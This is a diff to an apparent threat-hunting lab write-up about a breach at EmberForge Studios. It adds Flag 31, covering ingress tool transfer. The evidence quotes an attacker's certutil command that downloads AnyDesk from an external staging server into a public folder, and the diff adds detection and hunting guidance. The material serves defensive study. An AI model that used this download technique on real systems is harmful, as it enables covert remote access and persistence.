@@ -149,7 +149,7 @@ A security breach was identified within EmberForge Studios, prompting a focused 
 | 28 | MITRE ATT&CK: T1562.004 – Impair Defenses: Modify System Firewall | T1562 – Impair Defenses.| <Placeholder> |
 | 29 | MITRE ATT&CK: T1055 – Process Injection | T1055 – Process Injection | <Placeholder> |
 | 30 | MITRE ATT&CK: T1021.002 – SMB/Windows Admin Shares | T1021 – Remote Services | <Placeholder> |
-| 31 | <Placeholder> | <Placeholder> | <Placeholder> |
+| 31 | MITRE ATT&CK: T1105 – Ingress Tool Transfer | T1105 – Ingress Tool Transfer | <Placeholder> |
 | 32 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 33 | <Placeholder> | <Placeholder> | <Placeholder> |
 | 34 | <Placeholder> | <Placeholder> | <Placeholder> |
@@ -1564,23 +1564,28 @@ Search for patterns involving `\\*\C$` combined with file copy operations. When 
 <summary id="-flag-31">🚩 <strong>Flag 31: <Technique Name></strong></summary>
 
 ### 🎯 Objective
-<What the attacker was trying to accomplish>
+Download additional tooling (AnyDesk) from attacker-controlled infrastructure to enable remote access and maintain control over the compromised server.
 
 ### 📌 Finding
-<High-level description of the activity>
+A built-in Windows utility (`certutil.exe`) was abused to download a remote access tool from an external staging server, demonstrating Living Off the Land (LOLBins) technique to avoid detection.
 
 ### 🔍 Evidence
 
 | Field | Value |
 |------|-------|
-| Host | <Placeholder> |
-| Timestamp | <Placeholder> |
-| Process | <Placeholder> |
-| Parent Process | <Placeholder> |
-| Command Line | <Placeholder> |
+| Host | EC2AMAZ-16V3AU4.emberforge.local |
+| Timestamp | 2026-01-30 22:10:52.841 UTC |
+| Process | certutil.exe |
+| Parent Process | cmd.exe |
+| Command Line | certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\Users\Public\AnyDesk.exe |
 
 ### 💡 Why it matters
-<Explain impact, risk, and relevance>
+`certutil.exe` is a trusted Windows utility, commonly abused by attackers to download payloads without introducing new tools. This technique:
+- Evades traditional application allowlisting
+- Blends in with legitimate system activity
+- Enables delivery of remote access tools (like AnyDesk) for persistent control
+
+This indicates **tool staging and persistence setup**, escalating the attacker’s ability to maintain access and operate remotely.
 
 ### 🔧 KQL Query Used
 EmberForgeX_CL
@@ -1595,9 +1600,18 @@ EmberForgeX_CL
 <img width="2248" height="1062" alt="image" src="https://github.com/user-attachments/assets/0d776d8d-d4ff-4145-bc51-82128e0653ad" />
 
 ### 🛠️ Detection Recommendation
+Monitor for:
+- `certutil.exe` usage with `-urlcache`, `-split`, or external URLs
+- Downloads to suspicious directories (e.g., `C:\Users\Public`)
+- Command-line activity involving HTTP/HTTPS from system utilities
+
+Correlate with:
+- External network connections
+- Execution of newly downloaded binaries
+- Other LOLBin usage (PowerShell, bitsadmin, curl)
 
 **Hunting Tip:**  
-<Actionable guidance for defenders>
+Search for command lines containing `certutil` + `http` or `https`. Pay special attention to downloads targeting public or writable directories and uncommon domains mimicking legitimate infrastructure.
 
 </details>
 
